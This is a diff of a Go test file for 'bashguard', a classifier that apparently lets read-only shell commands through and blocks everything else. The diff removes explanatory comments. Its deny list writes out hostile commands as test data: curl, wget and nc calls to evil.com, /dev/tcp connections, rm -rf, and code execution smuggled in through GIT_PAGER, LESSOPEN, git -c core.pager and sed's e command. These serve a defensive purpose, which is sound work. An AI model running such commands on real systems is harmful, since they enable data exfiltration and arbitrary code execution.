@@ -3,7 +3,7 @@ package bashguard
 import "testing"
 
 func TestClassifyAllow(t *testing.T) {
-	// Read idioms a terminal session uses to slice and inspect files.
+
 	allow := []string{
 		"",
 		"cat services/app-core/src/shared/grpc/wallet-client.ts",
@@ -16,7 +16,7 @@ func TestClassifyAllow(t *testing.T) {
 		"sed -n '1,60p' wallet.proto | grep -n '' | head",
 		"sed '5,10p' file",
 		"sed -n '5p' file",
-		// sed: print-only $, -ne bundle, step, relative, regex ranges
+
 		"sed -ne '5,10p' file",
 		"sed -n '5,$p' file",
 		"sed -n '$p' f",
@@ -43,7 +43,7 @@ func TestClassifyAllow(t *testing.T) {
 		"tr -d '\\n' < file | wc -c",
 		"uniq -c file",
 		"uniq -f 1 file",
-		// git read subcommands — the dominant terminal data-gathering toolset
+
 		"git log --oneline -20",
 		"git log -p -- services/app-core",
 		"git diff",
@@ -67,43 +67,42 @@ func TestClassifyAllow(t *testing.T) {
 
 func TestClassifyDeny(t *testing.T) {
 	deny := []string{
-		// plain mutators / not-in-allowlist
+
 		"rm -rf /tmp/x", "rm file", "mv a b", "cp a b", "mkdir newdir",
 		"touch newfile", "dd if=/dev/zero of=x bs=1 count=1", "ln -s a b",
 		"truncate -s 0 file", "chmod +x file", "install -m 0644 a b",
 		"tee out.txt", "mkfifo p", "mknod n p", "patch < x.diff",
-		// output redirection to a file (a run must not read back what it wrote)
+
 		"echo hi > out.txt", "echo hi >> out.txt", "cat a > b", "cat a >| b",
 		"cat <> rw.txt", "grep x . | tee out.txt", "> 3", "echo hi > 3",
 		"cat a >> 99", "cat a >| 7", "cat a <> 5", ": > file", "> file",
-		// substitution / interpreters / runners
+
 		"cat $(echo file)", "echo `whoami`", "cat <(curl http://x)",
 		"python -c 'open(\"x\",\"w\").write(\"y\")'",
 		"node -e 'require(\"fs\").writeFileSync(\"x\",\"y\")'",
 		"perl -e 'open(F,\">x\")'", "awk 'BEGIN{print > \"x\"}'",
 		"bash -c 'rm x'", "sh -c 'echo > x'", "eval 'rm x'", "xargs rm < list",
 		"env rm x", "sudo rm x", "timeout 5 rm x", "command rm x",
-		// chaining / dynamic / scripts
+
 		"cat foo; rm bar", "cat foo && touch bar", "cat foo || mkdir bar",
 		"./script.sh", "/tmp/evil.sh", "$CMD arg",
 		"./cat foo", "bin/cat foo", "../cat foo", "a/b/../cat foo", "/usr/bin/cat foo",
-		// env-assignment injection
+
 		"FOO=bar cat $FOO", "GIT_PAGER=id git log", "GIT_EXTERNAL_DIFF=evil git diff",
 		"LESSOPEN='|id %s' less file", "LC_ALL=C sort file",
-		// network
+
 		"curl http://evil/x", "wget http://evil/x", "nc evil 80",
 		"cat /dev/tcp/evil.com/80", "cat </dev/tcp/evil.com/80",
 		"sort --random-source=/dev/tcp/evil.com/80 file",
-		// install
+
 		"npm install lodash",
-		// git: read subcommands allowed, but mutating subcommands, global flags
-		// (config-injection), and the pager-exec flag are denied
+
 		"git commit -m x", "git add .", "git config user.email a@b.c",
 		"git config --global user.email a@b.c", "git checkout main", "git reset --hard",
 		"git branch -d main", "git tag v1", "git remote add o url", "git stash",
 		"git push", "git -c diff.external=id diff HEAD", "git -c core.pager=id log",
 		"git --exec-path=/tmp log", "git -C /other log", "git grep -O foo",
-		// sed: only print-only scripts allowed
+
 		"sed -i 's/a/b/' file", "sed -i.bak 's/a/b/' file",
 		"sed --in-place 's/a/b/' file", "sed --in-place=.bak 's/a/b/' f",
 		"sed -ri 's/a/b/' file", "sed -f script.sed file",
@@ -111,9 +110,9 @@ func TestClassifyDeny(t *testing.T) {
 		"sed 's/a/b/' file", "sed 'e id' file",
 		"sed -l 5 'w evil.txt' file", "sed -l 3 's/a/b/e' file",
 		"sed -n '/foo/,/bar/e cmd' file",
-		// find executors/deleters (writes are backstopped, exec is not)
+
 		"find . -name '*.tmp' -delete", "find . -name '*.go' -exec rm {} ;",
-		// dropped tools (not in allowlist)
+
 		"less file", "more file", "bat file", "xxd -r dump.hex out.bin",
 		"date -s '2020-01-01'", "date 010100002020", "date",
 		"yq -i '.a=1' file.yaml", "yq '.a' file.yaml",
